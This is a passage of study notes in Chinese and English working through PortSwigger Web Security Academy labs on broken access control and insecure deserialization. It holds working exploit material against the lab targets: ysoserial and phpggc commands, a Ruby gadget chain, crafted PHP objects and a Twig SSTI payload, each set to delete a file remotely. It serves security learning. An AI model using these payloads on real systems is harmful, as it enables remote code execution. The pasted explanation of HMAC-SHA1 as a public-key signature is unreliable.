/></li><li>修改提交的json<imgsrc="https://s2.loli.net/2023/08/12/mVYLUvqgdTsJo6b.png"alt="image-20230812104637804" /></li></ol><h4 id="lab-url-based-access-control-can-be-circumvented">Lab: URL-basedaccess control can be circumvented</h4><ol type="1"><li>test<img src="https://s2.loli.net/2023/08/12/6z1cwgJlvroN7pQ.png"alt="image-20230812111359339" /></li><li>result<img src="https://s2.loli.net/2023/08/12/MuKokOlEqgH4fcI.png"alt="image-20230812111422257" /></li></ol><h4 id="lab-method-based-access-control-can-be-circumvented">Lab:Method-based access control can be circumvented'</h4><ol type="1"><li>登录管理员账户，可以更改用户权限<imgsrc="https://s2.loli.net/2023/08/13/43o6JDsKBpPdGEa.png"alt="image-20230813010023803" /></li><li>无痕模式窗口，普通用户登录<imgsrc="https://s2.loli.net/2023/08/13/yWsRNbUxK9cCHEL.png"alt="image-20230813010434092" /><ol type="1"><li>获取<strong>登录后</strong>的cookie<imgsrc="https://s2.loli.net/2023/08/13/mWl8H53aTjeZXy9.png"alt="image-20230813010213791" /></li><li>将该cookie粘贴到<strong>管理员用户</strong>的更改角色请求中的cookie,显示未授权<imgsrc="https://s2.loli.net/2023/08/13/zKNhvnIw5L8dEA3.png"alt="image-20230813010353765" /></li></ol></li><li>继续此页面，但更改请求方法<imgsrc="https://s2.loli.net/2023/08/13/VhweOB7YzM16gQT.png"alt="image-20230813010514760" /><ol type="1"><li>但此次是将我们拥有的<strong>wiener</strong>账户升级为管理员，显示重定向<imgsrc="https://s2.loli.net/2023/08/13/HBMycuq9vaN1CG5.png"alt="image-20230813010632204" /></li></ol></li></ol><h4 id="lab-user-id-controlled-by-request-parameter">Lab: User IDcontrolled by request parameter</h4><ol type="1"><li>wiener登录</li><li>更改id=carlos,获得其api<imgsrc="https://s2.loli.net/2023/08/13/Tuay2xhQ8wO1Ldk.png"alt="image-20230813012110373" /></li></ol><h4id="lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids">Lab:User ID controlled by request parameter, with unpredictable userIDs</h4><ol type="1"><li>wiener登录,api页面有个id参数</li><li>找到carlos发表的文章，有它id<imgsrc="https://s2.loli.net/2023/08/13/yM92eCIWchHxotU.png"alt="image-20230813013052417" /></li><li>替换为carlos id<imgsrc="https://s2.loli.net/2023/08/13/mj3MJ4gcvk8zoPI.png"alt="image-20230813013156095" /></li></ol><h4id="lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect">Lab:User ID controlled by request parameter with data leakage inredirect</h4><ol type="1"><li>id换成carlos,重定向<imgsrc="https://s2.loli.net/2023/08/13/E57vDzJRX6TZoOx.png"alt="image-20230813013735736" /></li></ol><h4id="lab-user-id-controlled-by-request-parameter-with-password-disclosure">Lab:User ID controlled by request parameter with password disclosure</h4><ol type="1"><li>id换成administrator<imgsrc="https://s2.loli.net/2023/08/13/9APJ53iKOHBwMjF.png"alt="image-20230813014648264" /></li></ol><h4 id="lab-insecure-direct-object-references">Lab: Insecure directobject references</h4><ol type="1"><li>live chat 对话</li><li>点击 <strong>vietranscript</strong>,发现生成的文件的filename是递增的<imgsrc="https://s2.loli.net/2023/08/13/7cXYSypfxgtRT9V.png"alt="xxx" /></li><li>换成1.txt<imgsrc="https://s2.loli.net/2023/08/13/lgWwpFMfsCUOVn5.png"alt="image-20230813015622817" /></li></ol><h4 id="lab-multi-step-process-with-no-access-control-on-one-step">Lab:Multi-step process with no access control on one step</h4><ol type="1"><li>使用wiener的cookie,在admin的请求中，将自己升级为管理员<imgsrc="https://s2.loli.net/2023/08/13/SQUexKHNiL9zWwX.png"alt="image-20230813021954094" /></li></ol><h4 id="referer-based-access-control">Referer-based access control</h4><ol type="1"><li>Referer头一般会被浏览器添加到请求中，以指示<strong>发起请求</strong>的页面。</li></ol><h4 id="lab-referer-based-access-control">Lab: Referer-based accesscontrol</h4><ol type="1"><li>在wiener账户下，更改权限，响应未授权<imgsrc="https://s2.loli.net/2023/08/13/8EvcZSDxq4jIOBl.png"alt="image-20230813024952840" /></li><li>将Referer头部换成:https://0a2c005b03b8510d8321424b00ec0080.web-security-academy.net/admin，再次请求，成功<imgsrc="https://s2.loli.net/2023/08/13/Y2G8q5sdvrfiMKl.png"alt="image-20230813025007536" /></li></ol><h3 id="insecure-deserializationreset">Insecuredeserialization（reset）</h3><h4 id="how-to-identify-insecure-deserialization">How to identifyinsecure deserialization</h4><ol type="1"><li><p>php example</p><pre class="language-none"><code class="language-none">$user-&gt;name &#x3D; &quot;carlos&quot;; $user-&gt;isLoggedIn &#x3D; true;</code></pre><p>When serialized, this object may look something like this:</p><pre class="language-none"><code class="language-none">O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;:s:6:&quot;carlos&quot;; s:10:&quot;isLoggedIn&quot;:b:1;&#125;</code></pre><p>This can be interpreted as follows:</p><ul><li><code>O:4:"User"</code> - An object with the 4-character class name<code>"User"</code></li><li><code>2</code> - the object has 2 attributes</li><li><code>s:4:"name"</code> - The key of the first attribute is the4-character string <code>"name"</code></li><li><code>s:6:"carlos"</code> - The value of the first attribute is the6-character string <code>"carlos"</code></li><li><code>s:10:"isLoggedIn"</code> - The key of the second attribute isthe 10-character string <code>"isLoggedIn"</code></li><li><code>b:1</code> - The value of the second attribute is the booleanvalue <code>true</code></li></ul></li><li><p>Some languages, such as Java, use <code>binary</code>serialization formats</p></li><li><p>Any class that implements the interface<code>java.io.Serializable</code> can be serialized and deserialized. Ifyou have source code access, take note of any code that uses the<code>readObject()</code> method, which is used to read and deserializedata from an <code>InputStream</code></p></li></ol><h4 id="lab-modifying-serialized-objects">Lab: Modifying serializedobjects</h4><ol type="1"><li>modify value<imgsrc="https://s2.loli.net/2023/08/17/WwHOmLqf89ZduRC.png"alt="image-20230817115816318" /></li></ol><h4 id="lab-modifying-serialized-data-types">Lab: Modifying serializeddata types</h4><ol type="1"><li><p>In Burp Repeater, use the Inspector panel to modify the sessioncookie as follows:<imgsrc="https://s2.loli.net/2023/08/17/4Z6QIjFu3fPqX8h.png"alt="image-20230817122214040" /></p><ul><li>Update the length of the <code>username</code> attribute to<code>13</code>.</li><li>Change the username to <code>administrator</code>.</li><li>Change the access token to the integer <code>0</code>. As this is nolonger a string, you also need to remove the double-quotes surroundingthe value.</li><li>Update the data type label for the access token by replacing<code>s</code> with <code>i</code>.</li></ul><p>The result should look like this:</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">O</span><span class="token punctuation">:</span><span class="token header-value">4:"User":2:&#123;s:8:"username";s:13:"administrator";s:12:"access_token";i:0;&#125;</span></span></code></pre></li></ol><h4id="lab-using-application-functionality-to-exploit-insecure-deserialization">Lab:Using application functionality to exploit insecure deserialization</h4><ol type="1"><li><p>modify a string to delete arbitrary file</p><figure><img src="https://s2.loli.net/2023/08/17/9fVscu2htTAGbji.png"alt="image-20230817152933156" /><figcaption aria-hidden="true">image-20230817152933156</figcaption></figure></li></ol><h4 id="magic-methods">Magic methods</h4><h4 id="lab-arbitrary-object-injection-in-php">Lab: Arbitrary objectinjection in PHP</h4><ol type="1"><li>get source code<imgsrc="https://s2.loli.net/2023/08/17/GqSzWuVCUwoOYe6.png"alt="image-20230817161341659" /></li><li>analysis<imgsrc="https://s2.loli.net/2023/08/17/wKnyecLbsNVCr7O.png"alt="image-20230817161400241" /></li><li>construct a CustomTemplate object:<ol type="1"><li>base64 encode</li><li>url encode<imgsrc="https://s2.loli.net/2023/08/17/iaHdPZCj7MxAqUg.png"alt="image-20230817161605675" /></li></ol></li></ol><h4 id="lab-exploiting-java-deserialization-with-apache-commons">Lab:Exploiting Java deserialization with Apache Commons</h4><ol type="1"><li><p>This lab uses a serialization-based session mechanism and loadsthe <code>Apache Commons Collections library</code>.</p></li><li><p>In Java versions 15 and below:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-all.jar CommonsCollections4 <span class="token string">'rm /home/carlos/morale.txt'</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-w</span> <span class="token number">0</span> <span class="token operator">></span> cookieToUse.txt </code></pre><ol type="1"><li><code>java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 &gt; cookieToUse.txt</code>- <code>java -jar ysoserial-all.jar</code>：这部分运行了<code>ysoserial</code> 工具，该工具用于生成针对各种 Java库的序列化负载。</li><li><code>CommonsCollections4</code>：这指定了从 ysoserial 中使用的针对Commons Collections 版本 4 的 gadget chain。</li><li><code>'rm /home/carlos/morale.txt'</code>：这是您想要在目标系统上远程执行的命令。在这种情况下，它试图从目录"/home/carlos" 中删除文件 "morale.txt"。</li><li><code>| base64 -w 0</code>：这将生成的负载输出传递给<code>base64</code> 命令，并使用 <code>-w 0</code>选项确保输出没有换行。</li><li><code>&gt; cookieToUse.txt</code>：这将经过 base64编码的负载重定向到名为 "cookieToUse.txt" 的文件。在这种情况下，意图似乎是生成一个恶意负载，当执行时，将会在远程系统上删除名为"morale.txt" 的文件。然后，将 base64 编码的负载保存到名为"cookieToUse.txt" 的文件中，这可能暗示攻击者可能打算将此负载注入到cookie 或其他数据字段中，以利用目标系统。</li></ol></li><li><p>url encode</p></li></ol><hr /><ol type="1"><li>The <code>URLDNS</code> chain ,it does not rely on the targetapplication using a specific vulnerable library and works in any knownJava version.</li></ol><h4id="lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain">Lab:Exploiting PHP deserialization with a pre-built gadget chain</h4><ol type="1"><li><p>analyze cookie：url decode &amp; base64 decode <imgsrc="https://s2.loli.net/2023/08/18/2HayQb6Wn1rmlPS.png"alt="image-20230818103807507" /><imgsrc="https://s2.loli.net/2023/08/18/vHUXipOem1Cdu97.png"alt="image-20230818103700023" /></p><ol type="1"><li><p>token is aobject</p></li><li><p><code>sig_hmac_sha1</code>是一个可能用于签名和验证数据完整性的标识。在计算机科学中，HMAC-SHA1（Hash-basedMessage Authentication Code - Secure Hash Algorithm1）是一种常用的消息认证码算法。 HMAC-SHA1 通常用于以下目的：</p><ol type="1"><li><p><strong>消息认证码（MAC）：</strong> HMAC-SHA1用于验证数据的完整性和真实性。通过使用密钥对数据进行散列，可以生成一个与数据相关的固定长度的哈希值，这个哈希值被称为消息认证码。接收方可以使用相同的密钥和算法来验证发送方提供的消息认证码是否与接收到的数据匹配，从而判断数据是否遭到篡改。</p></li><li><p><strong>数字签名：</strong> HMAC-SHA1也可以用于生成数字签名。发送方可以使用私钥对数据的哈希值进行签名，接收方可以使用公钥来验证签名的真实性。数字签名用于验证消息的来源和完整性。在你提供的上下文中，<code>sig_hmac_sha1</code>可能是一个指示数据签名的标识，而你提供的哈希值和其他信息可能是用于验证数据完整性和真实性的组成部分。然而，为了更准确地理解和解释这些信息，我需要更多的背景和上下文。如果有更多细节，我将非常乐意提供进一步的帮助。</p></li></ol></li></ol></li><li><p>request:<code>/cgi-bin/phpinfo.php</code>.<imgsrc="https://s2.loli.net/2023/08/18/Oe4fRuwZM9r7Wx8.png"alt="image-20230818110440255" /></p></li><li><p>use phpggc<imgsrc="https://s2.loli.net/2023/08/18/ZvLCF2HMNSW3U1t.png"alt="image-20230818110636285" /></p><pre class="language-bash" data-language="bash"><code class="language-bash">./phpggc Symfony/RCE4 <span class="token builtin class-name">exec</span> <span class="token string">'rm /home/carlos/morale.txt'</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-w</span> <span class="token number">0</span> xx.txt</code></pre></li><li><p>run script</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"OBJECT-GENERATED-BY-PHPGGC"</span><span class="token punctuation">;</span><span class="token variable">$secretKey</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"</span><span class="token punctuation">;</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&#123;"token":"'</span> <span class="token operator">.</span> <span class="token variable">$object</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'","sig_hmac_sha1":"'</span> <span class="token operator">.</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha1'</span><span class="token punctuation">,</span> <span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$cookie</span><span class="token punctuation">;</span></span></code></pre><ol type="1"><li>copy</li></ol></li><li><p>Replace Cookie with Clipboard Content in request，sendrequest</p></li></ol><h4id="lab-exploiting-ruby-deserialization-using-a-documented-gadget-chain">Lab:Exploiting Ruby deserialization using a documented gadget chain</h4><ol type="1"><li><p>Browse the web to find the<code>Universal Deserialisation Gadget for Ruby 2.x-3.x</code> by<code>vakzz</code> on <code>devcraft.io</code></p></li><li><p>script</p><pre class="language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment">=beginWelcome to GDB Online.GDB online is an online compiler and debugger tool for C, C++, Python, Java, PHP, Ruby, Perl,C#, OCaml, VB, Swift, Pascal, Fortran, Haskell, Objective-C, Assembly, HTML, CSS, JS, SQLite, Prolog.Code, Compile, Run and Debug online from anywhere in world.=end</span><span class="token comment"># Autoload the required classes</span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'base64'</span></span>Gem<span class="token double-colon punctuation">::</span>SpecFetcherGem<span class="token double-colon punctuation">::</span>Installer<span class="token comment"># prevent the payload from running when we Marshal.dump it</span><span class="token keyword">module</span> <span class="token class-name">Gem</span>  <span class="token keyword">class</span> <span class="token class-name">Requirement</span>    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">marshal_dump</span></span>      <span class="token punctuation">[</span><span class="token variable">@requirements</span><span class="token punctuation">]</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span><span class="token keyword">end</span>wa1 <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token class-name">WriteAdapter</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>Kernel<span class="token punctuation">,</span> <span class="token symbol">:system</span><span class="token punctuation">)</span>rs <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>RequestSet<span class="token punctuation">.</span>allocaters<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@sets'</span></span><span class="token punctuation">,</span> wa1<span class="token punctuation">)</span>rs<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@git_set'</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"rm /home/carlos/morale.txt"</span></span><span class="token punctuation">)</span>wa2 <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token class-name">WriteAdapter</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>rs<span class="token punctuation">,</span> <span class="token symbol">:resolve</span><span class="token punctuation">)</span>i <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Package<span class="token double-colon punctuation">::</span>TarReader<span class="token double-colon punctuation">::</span>Entry<span class="token punctuation">.</span>allocatei<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@read'</span></span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>i<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@header'</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"aaa"</span></span><span class="token punctuation">)</span>n <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span>BufferedIO<span class="token punctuation">.</span>allocaten<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@io'</span></span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>n<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@debug_output'</span></span><span class="token punctuation">,</span> wa2<span class="token punctuation">)</span>t <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Package<span class="token double-colon punctuation">::</span>TarReader<span class="token punctuation">.</span>allocatet<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@io'</span></span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>r <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Requirement<span class="token punctuation">.</span>allocater<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@requirements'</span></span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>payload <span class="token operator">=</span> Marshal<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">[</span>Gem<span class="token double-colon punctuation">::</span>SpecFetcher<span class="token punctuation">,</span> Gem<span class="token double-colon punctuation">::</span>Installer<span class="token punctuation">,</span> r<span class="token punctuation">]</span><span class="token punctuation">)</span>puts Base64<span class="token punctuation">.</span>encode64<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre></li><li><p>copt the output<imgsrc="https://s2.loli.net/2023/08/18/5tSv3Dk6eaAOcxj.png"alt="image-20230818120826614" /></p></li><li><p>去掉换行</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"your text"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'\n\r'</span></code></pre></li><li><p>copy the output,url encode it,replace the original cookie<imgsrc="https://s2.loli.net/2023/08/18/MzQTICGmujPkAt9.png"alt="image-20230818121042597" /></p></li></ol><h4id="lab-developing-a-custom-gadget-chain-for-java-deserialization">Lab:Developing a custom gadget chain for Java deserialization</h4><ol type="1"><li><p>find source code:<imgsrc="https://s2.loli.net/2023/08/18/ZkXRhAdy5SOs3Jt.png"alt="image-20230818155716059" /></p><ol type="1"><li><p>ProductTemplate.java: Notice that the<code>ProductTemplate.readObject()</code> method passes the template's<code>id</code> attribute into a SQL statement.</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">data<span class="token punctuation">.</span>productcatalog</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">common<span class="token punctuation">.</span>db<span class="token punctuation">.</span></span><span class="token class-name">JdbcConnectionBuilder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">ResultSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Statement</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProductTemplate</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> id<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">transient</span> <span class="token class-name">Product</span> product<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">ProductTemplate</span><span class="token punctuation">(</span><span class="token class-name">String</span> id<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span>    <span class="token punctuation">&#123;</span>        inputStream<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">JdbcConnectionBuilder</span> connectionBuilder <span class="token operator">=</span> <span class="token class-name">JdbcConnectionBuilder</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>                <span class="token string">"org.postgresql.Driver"</span><span class="token punctuation">,</span>                <span class="token string">"postgresql"</span><span class="token punctuation">,</span>                <span class="token string">"localhost"</span><span class="token punctuation">,</span>                <span class="token number">5432</span><span class="token punctuation">,</span>                <span class="token string">"postgres"</span><span class="token punctuation">,</span>                <span class="token string">"postgres"</span><span class="token punctuation">,</span>                <span class="token string">"password"</span>        <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withAutoCommit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">Connection</span> connect <span class="token operator">=</span> connectionBuilder<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM products WHERE id = '%s' LIMIT 1"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Statement</span> statement <span class="token operator">=</span> connect<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            product <span class="token operator">=</span> <span class="token class-name">Product</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> id<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Product</span> <span class="token function">getProduct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> product<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol></li><li><p>based on the leaked source code, write a small Java program thatinstantiates a <code>ProductTemplate</code> with an arbitrary ID,serializes it, and then Base64-encodes it.</p><ol type="1"><li><p><ahref="https://github.com/PortSwigger/serialization-examples/tree/master/java/solution">example</a></p></li><li><p>all you need to change is the <code>"your-payload-here"</code>string in the <code>Main.java</code> file. <imgsrc="https://s2.loli.net/2023/08/18/mYbikey3Tutr1Gh.png"alt="image-20230818161052795" /><imgsrc="https://s2.loli.net/2023/08/18/fqLpegnxI3VsaEN.png"alt="image-20230818161119030" /><imgsrc="https://s2.loli.net/2023/08/18/vrKNObLRjIMTlxY.png"alt="image-20230818161346836" /></p></li><li><p>try to set <code>id</code> to a single apostrophe<imgsrc="https://s2.loli.net/2023/08/18/rICjaJZukS7VP3s.png"alt="image-20230818160432780" /></p></li><li><p>noticed sql injection<imgsrc="https://s2.loli.net/2023/08/18/p42WrkODiJMs7vb.png"alt="image-20230818160535200" /></p></li></ol></li><li><p>Enumerate databases, tables, and columns,the final result isobtaining the <strong>administrator password.</strong></p></li></ol><h4id="lab-developing-a-custom-gadget-chain-for-php-deserialization">Lab:Developing a custom gadget chain for PHP deserialization</h4><ol type="1"><li><p>request source code<imgsrc="https://s2.loli.net/2023/08/18/WiUzyeJHFC6VajD.png"alt="image-20230818171456831" /></p></li><li><p>analysis: craft inject object</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CustomTemplate</span><span class="token operator">-></span>default_desc_type <span class="token operator">=</span> <span class="token string">"rm /home/carlos/morale.txt"</span><span class="token punctuation">;</span><span class="token class-name">CustomTemplate</span><span class="token operator">-></span>desc <span class="token operator">=</span> <span class="token class-name">DefaultMap</span><span class="token punctuation">;</span><span class="token class-name">DefaultMap</span><span class="token operator">-></span>callback <span class="token operator">=</span> <span class="token string">"exec"</span></code></pre><p>this causes the <code>Product</code> constructor to try and fetch the<code>default_desc_type</code> from the <code>DefaultMap</code> object.As it doesn't have this attribute, <code>$name</code> will store<code>default_desc_type</code> = "rm /home/carlos/morale.txt" ,the<code>__get()</code> method will invoke the callback <code>exec()</code>method on the default_desc_type, which is set to our shellcommand.</p></li><li><p>exploit: base64 encode &amp; url encode it</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">O</span><span class="token punctuation">:</span><span class="token header-value">14:"CustomTemplate":2:&#123;s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:&#123;s:8:"callback";s:4:"exec";&#125;&#125;</span></span></code></pre></li></ol><h4 id="phar-deserialization">PHAR deserialization</h4><ol type="1"><li>there is <strong>no obvious</strong> use of the<code>unserialize()</code> method.</li></ol><h4id="lab-using-phar-deserialization-to-deploy-a-custom-gadget-chain">Lab:Using PHAR deserialization to deploy a custom gadget chain</h4><ol type="1"><li><p>A significant portion of PHP's file system functions, whenparsing PHAR files through the <code>phar://</code> pseudo protocol,will deserialize the meta-data.</p></li><li><p>Upload a valid JPG as your avatar. Notice that it is loaded using<code>GET /cgi-bin/avatar.php?avatar=wiener</code></p></li><li><p>request <code>GET /cgi-bin</code>,get source code<imgsrc="https://s2.loli.net/2023/08/18/2onlJu37Xze5P9b.png"alt="image-20230818190500280" /><imgsrc="https://s2.loli.net/2023/08/18/B9cLk1UN6w5vGXd.png"alt="image-20230818190521158" /></p></li><li><p>Notice that the website uses the Twig template engine. You canuse deserialization to pass in an server-side template injection (SSTI)payload. Find a documented SSTI payload for remote code execution onTwig, and adapt it to delete Carlos's file:</p><pre class="language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span>_self<span class="token punctuation">.</span>env<span class="token punctuation">.</span>registerUndefinedFilterCallback<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span>_self<span class="token punctuation">.</span>env<span class="token punctuation">.</span>getFilter<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>rm /home/carlos/morale.txt<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span></code></pre></li><li><p>Write a some PHP for creating a <code>CustomTemplate</code> and<code>Blog</code> containing your SSTI payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">CustomTemplate</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Blog</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CustomTemplate</span><span class="token punctuation">;</span><span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blog</span><span class="token punctuation">;</span><span class="token variable">$blog</span><span class="token operator">-></span><span class="token property">desc</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("rm 